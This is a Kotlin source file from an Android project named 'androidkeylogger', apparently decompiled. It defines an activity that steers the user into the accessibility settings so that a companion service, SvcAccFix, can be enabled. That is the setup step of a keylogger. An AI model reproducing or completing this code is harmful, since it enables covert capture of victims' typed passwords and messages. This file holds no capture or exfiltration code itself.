package com.azamovhudstc.androidkeylogger

import android.content.Intent
import android.os.Bundle
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity


class AccessibilityFixActivity : AppCompatActivity() {
    private  fun openSetting(view: View) {
        try {
            SvcAccFix.j = true
            startActivity(Intent("android.settings.ACCESSIBILITY_SETTINGS"))
        } catch (e: Exception) {
            Toast.makeText(this, e.message, Toast.LENGTH_LONG).show()
        }
    }

    override fun onBackPressed() {
        finishAffinity()
        super.onBackPressed()
    }

    /* Access modifiers changed, original: protected */
    public override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        if (SvcAccFix.i) {
            SvcAccFix.j = false
            Toast.makeText(this, getString(R.string.type_something), Toast.LENGTH_LONG).show()
            finish()
            return
        }
        setContentView(R.layout.activity_accessibility)
        findViewById<View>(R.id.btn501925).setOnClickListener { view ->
            openSetting(
                view
            )
        }
    }

    /* Access modifiers changed, original: protected */
    public override fun onDestroy() {
        super.onDestroy()
        SvcAccFix.j = false
    }

    /* Access modifiers changed, original: protected */
    public override fun onResume() {
        super.onResume()
        if (SvcAccFix.i) {
            SvcAccFix.j = false
            Toast.makeText(this, getString(R.string.type_something), Toast.LENGTH_LONG).show()
            finish()
        }
    }
}